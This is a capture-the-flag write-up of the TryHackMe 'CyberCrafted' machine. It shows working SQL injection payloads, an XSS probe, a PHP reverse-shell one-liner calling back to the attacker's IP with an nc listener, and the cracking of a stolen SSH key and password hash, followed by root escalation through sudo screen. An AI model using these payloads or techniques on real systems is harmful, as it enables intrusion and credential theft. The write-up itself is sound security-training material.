---
layout: post
title: TryHackMe - CyberCrafted
date: 2023-09-29 23:50:00 +0700
tags: [challenge, injection, minecraft, linux]
toc: true
---

<p class="message">Pwn this pay-to-win Minecraft server!</p>

| Title      | CyberCrafted                           |
| ---------- | -------------------------------------- |
| Difficulty | Medium                                 |
| Author     | madrinch                               |
| Tags       | challenge, injection, minecraft, linux |

## Enumeration

### Nmap

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn cybercrafted.thm
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-29 09:48 EDT
Nmap scan report for cybercrafted.thm (10.10.251.95)
Host is up (0.26s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 14.37 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -Pn -p 22,80,25565 cybercrafted.thm
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-29 09:48 EDT
Nmap scan report for cybercrafted.thm (10.10.251.95)
Host is up (0.25s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Cybercrafted
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   263.96 ms 10.9.0.1
2   264.05 ms cybercrafted.thm (10.10.251.95)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.83 seconds
```

### HTTP (Port `80`)

![Untitled](/assets/CyberCrafted%20images/Untitled.png)

{% highlight html linenos %}

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Cybercrafted</title>
    <link rel="shortcut icon" type="image/png" href="assets/logo.png" />
    <style>
      body {
        margin: 0px;
        padding: 0px;
        background-color: #000;
      }

      div {
        position: relative;
      }

      img {
        width: 100%;
        height: 100%;
        min-width: 1280px;
        min-height: 720px;
      }
    </style>

  </head>
  <body>
    <div>
      <img src="assets/index.png" />
    </div>
  </body>
  <!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->
</html>
{% endhighlight %}

```
┌──(kali㉿kali)-[~/cybercrafted]
└─$ curl http://cybercrafted.thm/ | grep "<\!--"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   832  100   832    0     0   1558      0 --:--:-- --:--:-- --:--:--  1558
<!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->
```

### Sub-Domain Fuzzing

```
┌──(kali㉿kali)-[~/Wordlists]
└─$ wfuzz -w subdomains-top1mil-5000.txt -u http://cybercrafted.thm/ -H "Host: FUZZ.cybercrafted.thm" --hw 0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cybercrafted.thm/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        34 L     71 W       832 Ch      "www"
000000024:   200        30 L     64 W       937 Ch      "admin"
000000081:   403        9 L      28 W       287 Ch      "store"
[...]
```

```
┌──(kali㉿kali)-[~/cybercrafted]
└─$ sudo tail -n 3 /etc/hosts
10.10.251.95    cybercrafted.thm
10.10.251.95    admin.cybercrafted.thm
10.10.251.95    store.cybercrafted.thm
```

Route to the sub-domain **admin** and it displays a Login Form:

![Untitled](/assets/CyberCrafted%20images/Untitled%201.png)

Otherwise, the **store** domain restricts my access:

![Untitled](/assets/CyberCrafted%20images/Untitled%202.png)

### Dir Fuzzing

**default page**

```
┌──(kali㉿kali)-[~/Wordlists]
└─$ gobuster dir -w directory-list-2.3-medium.txt -t 40 --no-error -u http://cybercrafted.thm/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 321] [--> http://cybercrafted.thm/assets/]
/secret               (Status: 301) [Size: 321] [--> http://cybercrafted.thm/secret/]
```

![Untitled](/assets/CyberCrafted%20images/Untitled%203.png)

I download them all into my local directory:

```
┌──(kali㉿kali)-[~/cybercrafted]
└─$ ls -l
total 192
-rw-r--r-- 1 kali kali 126002 Jun 21  2021 background-1.jpg
-rw-r--r-- 1 kali kali  37351 Jun 21  2021 herobrine-3.jpeg
-rw-r--r-- 1 kali kali  27327 Jun 21  2021 pack-2.png
```

Using **exiftool**, I figure out an encoded string at the _Comment_ section:

```
┌──(kali㉿kali)-[~/cybercrafted]
└─$ exiftool pack-2.png
ExifTool Version Number         : 12.65
File Name                       : pack-2.png
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:06:21 16:21:12-04:00
File Access Date/Time           : 2023:09:29 10:03:55-04:00
File Inode Change Date/Time     : 2023:09:29 10:03:17-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 128
Image Height                    : 128
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Software                        : Paint.NET v3.5.5
Comment                         : ZLUOMQG6ZRAMFXGG2LFNZ2CA2LNMFTWK4ZAPFXXK
Image Size                      : 128x128
Megapixels                      : 0.016
```

Using online tool from [dcode](https://www.dcode.fr/cipher-identifier) to identify the type of cipher and it was detected as **base32** decode:

![Untitled](/assets/CyberCrafted%20images/Untitled%204.png)

However, I cannot decode it into a readable plaintext:

```
┌──(kali㉿kali)-[~/cybercrafted]
└─$ echo "ZLUOMQG6ZRAMFXGG2LFNZ2CA2LNMFTWK4ZAPFXXK" | base32 -d
���@��@�������@������@���
```

Maybe I need more clues to decode this string, or it is not the right way to exploit. I guess~

Move on with other images:

```
┌──(kali㉿kali)-[~/cybercrafted]
└─$ file background-1.jpg
background-1.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, progressive, precision 8, 1200x675, components 3

┌──(kali㉿kali)-[~/cybercrafted]
└─$ steghide --extract -sf background-1.jpg
Enter passphrase:
Corrupt JPEG data: 7 extraneous bytes before marker 0xc4
steghide: could not extract any data with that passphrase!

┌──(kali㉿kali)-[~/cybercrafted]
└─$ file herobrine-3.jpeg
herobrine-3.jpeg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 732x412, components 3

┌──(kali㉿kali)-[~/cybercrafted]
└─$ steghide --extract -sf herobrine-3.jpeg
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

These images might not be the right way to exploit the machine. Accordingly, I turn back to the sub-domain **admin**.

On the login page, I try to use **admin:admin** as the creds to login. Unfortunately, it was wrong. But I found something interesting: the **XSS** vulnerability:

![Untitled](/assets/CyberCrafted%20images/Untitled%205.png)

When I try to modify the value of `?error=` param, the error message turn into the value I have been modified:

![Untitled](/assets/CyberCrafted%20images/Untitled%206.png)

Trying with the `<script>alert(1)</script>` and it worked!

![Untitled](/assets/CyberCrafted%20images/Untitled%207.png)

However, after trying many payload to inject, I got stuck.

Get back to the questions in the **task 2**, I notice at this question:

![Untitled](/assets/CyberCrafted%20images/Untitled%208.png)

So, I guess that the **XSS** vulnerability on this domain (**admin**) should not be considered anymore. Then I pass it and move on to the subdomain **store** which restricted me earlier. This time I will fuzzing the target URL within focusing on the extension (`.php`):

```
┌──(kali㉿kali)-[~/Wordlists]
└─$ gobuster dir -w directory-list-2.3-medium.txt -t 40 --no-error -u http://store.cybercrafted.thm -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/[REDACTED]           (Status: 200) [Size: 838]
```

Oh! I got the new one! Try to input the result into the answer of the question and let’s see whether it is the right one to exploit:

![Untitled](/assets/CyberCrafted%20images/Untitled%209.png)

Haha yes it is!

Route to the **[REDACTED]** path and it displays a **searchbar** with could be vulnerable to the **SQL Injection Vulnerability**

![Untitled](/assets/CyberCrafted%20images/Untitled%2010.png)

## Exploit

### SQL Injection

I use **sqlmap** to scan through the target and find out these SQL Injection vulnerabilities:

```
┌──(kali㉿kali)-[~/TryHackMe/cybercrafted]
└─$ sqlmap -u http://store.cybercrafted.thm/[REDACTED] --form 'search=a&submit='
[..]
sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=eDgj' AND (SELECT 4462 FROM (SELECT(SLEEP(5)))hmcZ) AND 'vDpn'='vDpn&submit=hxLp

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=eDgj' UNION ALL SELECT NULL,NULL,CONCAT(0x717a627071,0x6f4578554f70574150457741766c6b494c4a61456465527756546c447348586c76526e6a776b7752,0x716a707871),NULL-- -&submit=hxLp
---
```

From the result, I can see that the **Search** field is vulnerable with the **UNION query** type with the number of required columns is **4**. Therefore, I will try to input this payload to see how would it display:

```
'UNION SELECT NULL,NULL,'A',NULL#
```

![Untitled](/assets/CyberCrafted%20images/Untitled%2011.png)

OK, the `'A'` character placed at the 3rd `NULL` is displayed at the 2nd column. Next, I list all the tables from each database:

```
'UNION SELECT NULL,table_schema,NULL,NULL FROM information_schema.tables#
```

![Untitled](/assets/CyberCrafted%20images/Untitled%2012.png)

![Untitled](/assets/CyberCrafted%20images/Untitled%2013.png)

![Untitled](/assets/CyberCrafted%20images/Untitled%2014.png)

I modify the query to retrieve the column_names from 3 tables which seem interested: **user** (mysql), **users** (performance_schema) and **admin** (webapp). Then only the **admin** table has the sensitive information of the user:

```
'UNION SELECT NULL,table_name,column_name,NULL FROM information_schema.columns WHERE table_name="admin"#
```

![Untitled](/assets/CyberCrafted%20images/Untitled%2015.png)

Then I query the **user** and the **hash** and get these:

![Untitled](/assets/CyberCrafted%20images/Untitled%2016.png)

I submit the **web_flag** and then save the creds I found. Using **john** to crack the hash and get the plaintext password:

```
┌──(kali㉿kali)-[~/TryHackMe/cybercrafted]
└─$ nano hash_creds

┌──(kali㉿kali)-[~/TryHackMe/cybercrafted]
└─$ john -w=~/Wordlists/rockyou.txt hash_creds
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
[...]
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED] ([REDACTED])
1g 0:00:00:00 DONE (2023-09-29 11:38) 1.234g/s 10663Kp/s 10663Kc/s 10663KC/s diamond125..diamond123123
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

### Reverse shell

I get back to the login page on **admin** domain and login using the creds I have found. And it brings me to this application:

![Untitled](/assets/CyberCrafted%20images/Untitled%2017.png)

I try some basic commands and it displays like this:

![Untitled](/assets/CyberCrafted%20images/Untitled%2018.png)

After that I establish a reverse shell using this payload:

```
php -r '$sock=fsockopen("10.9.63.75",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Start a listener and get connect:

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.145.62] 44792
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@cybercrafted:/var/www/admin$ ls -la
ls -la
total 28
drwxr-xr-x 3 www-data www-data 4096 Sep 12  2021 .
drwxr-xr-x 6 root     root     4096 Jun 26  2021 ..
drwxr-xr-x 2 www-data www-data 4096 Jun 20  2021 assets
-rwxr-xr-x 1 www-data www-data  195 Jun 21  2021 dbConn.php
-rwxr-xr-x 1 www-data www-data 1035 Jun 21  2021 index.php
-rwxr-xr-x 1 www-data www-data 1348 Jun 21  2021 login.php
-rwxr-xr-x 1 www-data www-data 1156 Jun 21  2021 panel.php
```

## Horizontal Privilege Escalation

### User 1

I navigate to the `/home/` directory, enumerate the users’ workstations and figure out the **.ssh** directory contains the **id_rsa** key used for the **ssh** conection:

```
www-data@cybercrafted:/home/[REDACTED]$ cd /home/
www-data@cybercrafted:/home/[REDACTED]$ ls -l
total 8
drwxr-x--- 4 cybercrafted        cybercrafted        4096 Sep 12  2021 cybercrafted
drwxr-xr-x 5 [REDACTED] [REDACTED] 4096 Oct 15  2021 [REDACTED]
www-data@cybercrafted:/home/[REDACTED]$ ls -la
ls -la
total 32
drwxr-xr-x 5 [REDACTED] [REDACTED] 4096 Oct 15  2021 .
drwxr-xr-x 4 root                root                4096 Jun 27  2021 ..
lrwxrwxrwx 1 root                root                   9 Sep 12  2021 .bash_history -> /dev/null
-rw-r--r-- 1 [REDACTED] [REDACTED]  220 Jun 27  2021 .bash_logout
-rw-r--r-- 1 [REDACTED] [REDACTED] 3771 Jun 27  2021 .bashrc
drwx------ 2 [REDACTED] [REDACTED] 4096 Jun 27  2021 .cache
drwx------ 3 [REDACTED] [REDACTED] 4096 Jun 27  2021 .gnupg
-rw-rw-r-- 1 [REDACTED] [REDACTED]    0 Jun 27  2021 .hushlogin
-rw-r--r-- 1 [REDACTED] [REDACTED]  807 Jun 27  2021 .profile
drwxrwxr-x 2 [REDACTED] [REDACTED] 4096 Jun 27  2021 .ssh
lrwxrwxrwx 1 root                root                   9 Oct 15  2021 .viminfo -> /dev/null
www-data@cybercrafted:/home/[REDACTED]$ cd .ssh
cd .ssh
www-data@cybercrafted:/home/[REDACTED]/.ssh$ ls -l
ls -l
total 8
-rw-r--r-- 1 [REDACTED] [REDACTED]  414 Jun 27  2021 authorized_keys
-rw-r--r-- 1 [REDACTED] [REDACTED] 1766 Jun 27  2021 id_rsa
```

Therefore, I copy the key to my local machine:

```
┌──(kali㉿kali)-[~/TryHackMe/cybercrafted]
└─$ nano id_rsa

┌──(kali㉿kali)-[~/TryHackMe/cybercrafted]
└─$ chmod 600 id_rsa
```

Then I establish a **ssh** connection to the host:

```
┌──(kali㉿kali)-[~/TryHackMe/cybercrafted]
└─$ ssh [REDACTED]@cybercrafted.thm -i id_rsa
The authenticity of host 'cybercrafted.thm (10.10.145.62)' can't be established.
ED25519 key fingerprint is SHA256:ebA122u0ERUidN6lFg44jNzp3OoM/U4Fi4usT3C7+GM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cybercrafted.thm' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

Oops! It requires the **paraphrase** for the key. To solve this, I use **ssh2john** to generate the hash from the key and crack it into plaintext:

```
┌──(kali㉿kali)-[~/TryHackMe/cybercrafted]
└─$ ssh2john id_rsa > id_rsa_hash

┌──(kali㉿kali)-[~/TryHackMe/cybercrafted]
└─$ john -w=~/Wordlists/rockyou.txt id_rsa_hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]      (id_rsa)
1g 0:00:00:00 DONE (2023-09-29 11:58) 1.818g/s 3447Kp/s 3447Kc/s 3447KC/s creepygoblin..creek93
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Once again, I re-connect to the target via **ssh** and enter the **passphrase**:

```
┌──(kali㉿kali)-[~/TryHackMe/cybercrafted]
└─$ ssh [REDACTED]@cybercrafted.thm -i id_rsa
Enter passphrase for key 'id_rsa':
[REDACTED]@cybercrafted:~$ id
uid=1001([REDACTED]) gid=1001([REDACTED]) groups=1001([REDACTED]),25565(minecraft)
```

### User 2

I can see the **25565(minecraft)** information from the **id** command, I decide to find where is the **minecraft** directory located and could it be exploited:

```
[REDACTED]@cybercrafted:~$ find / -name "minecraft" 2>/dev/null
/opt/minecraft
[REDACTED]@cybercrafted:~$ ls -l /opt/minecraft
total 16
drwxr-x--- 7 cybercrafted minecraft    4096 Jun 27  2021 cybercrafted
-rw-r----- 1 cybercrafted minecraft      38 Jun 27  2021 minecraft_server_flag.txt
-rw-r----- 1 cybercrafted minecraft     155 Jun 27  2021 note.txt
drwxr-x--- 2 cybercrafted cybercrafted 4096 Sep 12  2021 WorldBackup
```

Surprisingly that I find the **minecreaft_server_flag.txt** inside the target directory:

```
[REDACTED]@cybercrafted:~$ cd /opt/minecraft/
[REDACTED]@cybercrafted:/opt/minecraft$ cat minecraft_server_flag.txt
THM{[REDACTED]}
```

The next question asks the plugin’s name. So I use **grep** to search for all the **plugin** characters appear from the current directory, even the sub-directories:

```
[REDACTED]@cybercrafted:/opt/minecraft/cybercrafted$ grep -R "plugin"
[...]
help.yml:# ignore-plugins:
Binary file craftbukkit-1.7.2-server.jar matches
Binary file plugins/[REDACTED]_v.2.4.jar matches
logs/latest.log:        at org.bukkit.plugin.java.JavaPlugin.setEnabled(JavaPlugin.java:250) ~[craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
logs/latest.log:        at org.bukkit.plugin.java.JavaPluginLoader.enablePlugin(JavaPluginLoader.java:324) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
[...]
bukkit.yml:# As you can see, there's actually not that much to configure without any plugins.
bukkit.yml:  plugin-profiling: false
bukkit.yml:  query-plugins: true
```

Submit the plugin name and move into the **plugins** directory. Then I explore the **passwords.yml** file contains the password of user **cybercrafted**:

```
[REDACTED]@cybercrafted:/opt/minecraft/cybercrafted$ cd plugins
[REDACTED]@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls -l
total 48
drwxr-x--- 2 cybercrafted minecraft  4096 Oct  6  2021 [REDACTED]
-rwxr-x--- 1 cybercrafted minecraft 43514 Jun 27  2021 [REDACTED]_v.2.4.jar
[REDACTED]@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cd [REDACTED]/
[REDACTED]@cybercrafted:/opt/minecraft/cybercrafted/plugins/[REDACTED]$ ls -la
total 24
drwxr-x--- 2 cybercrafted minecraft 4096 Oct  6  2021 .
drwxr-x--- 3 cybercrafted minecraft 4096 Jun 27  2021 ..
-rwxr-x--- 1 cybercrafted minecraft  667 Sep 29 16:07 language.yml
-rwxr-x--- 1 cybercrafted minecraft  943 Sep 29 16:07 log.txt
-rwxr-x--- 1 cybercrafted minecraft   90 Jun 27  2021 passwords.yml
-rwxr-x--- 1 cybercrafted minecraft   25 Sep 29 16:07 settings.yml
[REDACTED]@cybercrafted:/opt/minecraft/cybercrafted/plugins/[REDACTED]$ cat passwords.yml
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
```

However, I cannot crack the hash even I know its hash-type is **MD5**. So I lookup to the **log.txt** file and figure out the password in plaintext:

```
[REDACTED]@cybercrafted:/opt/minecraft/cybercrafted/plugins/[REDACTED]$ cat log.txt

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet [REDACTED]!
[2021/06/27 11:25:16] cybercrafted registered. PW: [REDACTED]
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet [REDACTED]!
[2021/06/27 11:47:34] cybercrafted logged in. PW: [REDACTED]
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet [REDACTED]!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet [REDACTED]!
[2021/06/27 11:57:54] cybercrafted logged in. PW: [REDACTED]
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet [REDACTED]!
[2021/06/27 11:58:46] cybercrafted logged in. PW: [REDACTED]
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet [REDACTED]!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123

[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet [REDACTED]!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet [REDACTED]!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet [REDACTED]!
[2023/09/29 16:07:13] [BUKKIT-SERVER] Startet [REDACTED]!
```

Now it is easier for me to become user **cybercrafted** and get the user flag:

```
[REDACTED]@cybercrafted:/opt/minecraft/cybercrafted/plugins/[REDACTED]$ su cybercrafted
[sudo] password for cybercrafted:
cybercrafted@cybercrafted/opt/minecraft/cybercrafted/plugins/[REDACTED]$: cd
cybercrafted@cybercrafted:~$ cat user.txt
THM{[REDACTED]}
```

## Vertical Privilege Escalation

```
cybercrafted@cybercrafted:~$ sudo -l
[sudo] password for cybercrafted:
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```

Thanks to the [exploit-notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/) that instruct the way to exploit the **/usr/bin/screen -r** by pressing `Ctrl+a+c`, I simply execute the command with **sudo**:

```
cybercrafted@cybercrafted:~$ sudo /usr/bin/screen -r cybercrafted
```

Then press **Ctrl+a+c** and get the root shell:

```
# id
uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
# cd
# pwd
/root
# ls -l
total 4
-rw-r----- 1 root root 38 Jun 27  2021 root.txt
# cat root.txt
THM{[REDACTED]}
```
